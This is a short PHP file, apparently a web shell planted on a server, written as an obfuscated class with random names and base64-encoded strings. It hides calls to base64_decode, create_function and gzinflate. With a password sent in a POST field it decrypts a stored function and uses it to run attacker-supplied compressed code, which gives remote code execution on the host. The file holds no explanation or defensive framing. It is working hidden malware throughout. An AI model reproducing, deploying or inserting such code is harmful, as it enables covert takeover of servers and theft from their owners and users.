<?php

class c62bc507fc24c5
{
    private $r62bc507fc27c6 = [];

    public function __call($name, $args)
    {
        call_user_func_array($this->r62bc507fc27c6[$name], $args);
    }

    public function d62bc507fc367c($s)
    {
        $function = 'b' . 'ase' . '64' . '_' . 'de' . 'code';
        $string = $function($s);
        return explode('::', $string, 2)[1];
    }

    public function p62bc507fc27c3()
    {
        $qString = $this->d62bc507fc367c("aEFqUi9pRjdWNHdxZCszSDo6UVVFUllfU1RSSU5H");

        if (!empty($_SERVER[$qString])) {
            exit($_SERVER[$qString]);
        }

        $e = $this->d62bc507fc367c("Zy9pZmlHampSNUdHVXc9PTo6ZQ==");
        $p = $this->d62bc507fc367c("WVhsOEpSSU45MUZEUFN6djh3PT06OnA=");

        if (
            !isset($_POST[$e]) ||
            !isset($_POST[$p])
        ) {
            return;
        }

        $methodName = 'em62bc507fc367f';
        $methodContent = 'U0QDDx1WQggAbFFdRGlTEARGGB49U24fAw==';

        $base64decode = $this->d62bc507fc367c("cXJiUzZ6ZGlVQVVuOjpiYXNlNjRfZGVjb2Rl");
        $createFunction = $this->d62bc507fc367c("aEFhRk5ZOE5NUT09OjpjcmVhdGVfZnVuY3Rpb24=");
        $gzinflate = $this->d62bc507fc367c("V2Rwa3RxWHlic1RaMGgwPTo6Z3ppbmZsYXRl");
        $regex = $this->d62bc507fc367c("V0JpdzBBWDIyRHpINWpnPTo6L15bIC1+XSskLw==");

        $methodContent = str_split($base64decode($methodContent));

        $password = $_POST[$p];
        $password = str_split($password);

        $temp = [];

        for ($i = 0; $i < count($methodContent); $i++) {
            $temp[] = chr(ord($methodContent[$i]) ^ ord($password[$i % count($password)]));
        }

        $methodContent = implode('', $temp);

        if (preg_match($regex, $methodContent)) {
            $this->r62bc507fc27c6[$methodName] = $createFunction('', $methodContent);

            $code = $gzinflate($base64decode($_POST[$e]));
            $this->{$methodName}($code);
        }
    }
}

(new c62bc507fc24c5)->p62bc507fc27c3();